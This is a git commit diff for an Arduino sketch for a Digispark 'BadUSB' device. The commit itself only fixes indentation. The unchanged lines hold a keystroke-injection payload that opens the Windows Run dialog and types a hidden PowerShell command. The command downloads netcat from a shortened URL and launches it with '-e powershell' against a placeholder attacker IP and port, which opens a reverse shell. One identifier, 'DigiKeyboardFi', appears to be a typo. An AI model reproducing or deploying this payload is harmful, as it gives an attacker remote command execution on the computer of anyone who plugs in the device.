fcf29d3d35ae648826ffbc5486f0d6cd9ad5cc14
Pinokkio <112076418+miljonka@users.noreply.github.com>
2023-12-07 10:55:28 +0200

    Update digispark_revshell.ino

--- digispark/digispark_revshell/digispark_revshell.ino
+++ digispark/digispark_revshell/digispark_revshell.ino
@@ -5,7 +5,7 @@ void setup() {}
 void loop() {
 	// Description: BadUSB Reverse Shell v1.0
 	DigiKeyboard.delay(1000);
-	 DigiKeyboard.sendKeyStroke(0);
+	DigiKeyboard.sendKeyStroke(0);
 	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 	DigiKeyboard.delay(500);
  	DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:Temp/nc64.exe -Uri https://tinyurl.com/3dkmj364 ; Start-Process \"$env:Temp/nc64.exe\" -ArgumentList \'ATTACKER_IP\', \'ATTACKER_PORT\', \'-e\', \'powershell\' -NoNewWindow\"");
